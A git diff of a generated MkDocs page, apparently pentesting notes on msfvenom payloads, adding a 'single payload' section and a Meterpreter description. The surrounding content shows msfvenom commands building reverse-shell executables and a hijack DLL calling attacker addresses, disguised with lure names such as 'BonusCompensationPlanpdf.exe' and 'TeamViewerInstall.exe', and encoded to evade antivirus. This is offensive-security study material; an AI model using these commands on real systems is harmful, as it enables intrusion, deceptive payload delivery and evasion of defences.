@@ -2640,6 +2640,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#single-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      Single payload
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#staged-payload" class="md-nav__link">
     <span class="md-ellipsis">
       Staged payload
@@ -15755,6 +15764,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#single-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      Single payload
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#staged-payload" class="md-nav__link">
     <span class="md-ellipsis">
       Staged payload
@@ -15855,6 +15873,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h2 id="some-flags">Some flags</h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># -b, or --bad-chars: The list of characters to avoid example: &#39;0&#39;</span>
 </span></code></pre></div>
+<h2 id="single-payload">Single  payload</h2>
+<p><code>Singles</code> are self-contained payloads. Some exploits will not support the resulting size of these payloads as they can get quite large.</p>
 <h2 id="staged-payload">Staged payload</h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Example of a linux staged payload</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell/reverse_tcp<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span><span class="m">192</span>.66.166.2<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>newfile
@@ -15867,12 +15887,13 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div>
 <p>When creating a staged payload, you will need to use a metasploit handler (exploit/multi/handler) in order to receive the shell connection as only metasploit contains proper logic that will send the rest of the payload to the connector . In that case, the metasploit payload has to be the same one as the MSFVenom one.</p>
 <h2 id="stagedless-payload">Stagedless payload</h2>
-<p>A stage less payload is a standalone program that does not need anything aditional (no metasploit connection), just the netcat listener on the computer.</p>
+<p>A stage less payload is a standalone program that does not need anything adittional (no metasploit connection), just the netcat listener on the computer.</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Example of a windows stageless payload</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.113<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>BonusCompensationPlanpdf.exe
 </span></code></pre></div>
 <p>If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.</p>
 <h2 id="crafting-a-dll-file-with-a-webshell">crafting a DLL file with a webshell</h2>
+<p>The <code>Meterpreter</code> payload is a specific type of multi-faceted payload that uses <code>DLL injection</code> to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes.</p>
 <p><div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IPAttacker&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;<span class="m">4444</span>&gt;<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>-f<span class="w"> </span>dll<span class="w"> </span>&gt;<span class="w"> </span>SECUR32.dll
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># -p: for the chosen payload</span>
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># -a: architecture in the victim machine/application</span>
@@ -15881,8 +15902,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <a href="../thick-applications/tca-attacking-thick-clients-applications/#how-is-dll-hijacking-perform">More about DLL highjacking in thick client applications</a>.</p>
 <h3 id="crafting-a-exe-file-with-shikata-ga-nai-encoder">crafting a .exe file with Shikata Ga Nai encoder</h3>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>msfvenom<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="nv">$port</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>./TeamViewerInstall.exe
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># -e: chosen encoder </span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1"># -e: chosen encoder </span>
 </span></code></pre></div>
 <p>Shikata Ga Nai encoder will be most likely detected by AV and IDS/IPS. One better option would be to try running it through multiple iterations of the same Encoding scheme:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>msfvenom<span class="w"> </span>-a<span class="w"> </span>x86<span class="w"> </span>--platform<span class="w"> </span>windows<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="nv">$port</span><span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span><span class="w"> </span>-o<span class="w"> </span>/root/Desktop/TeamViewerInstall.exe
@@ -15964,7 +15984,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2023-07-12T19:45:03+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2023-07-12</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2024-09-23T20:22:13+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2024-09-23</span></small></br>
 
 
     <small>Created: February 2, 2023 19:36:50</small>
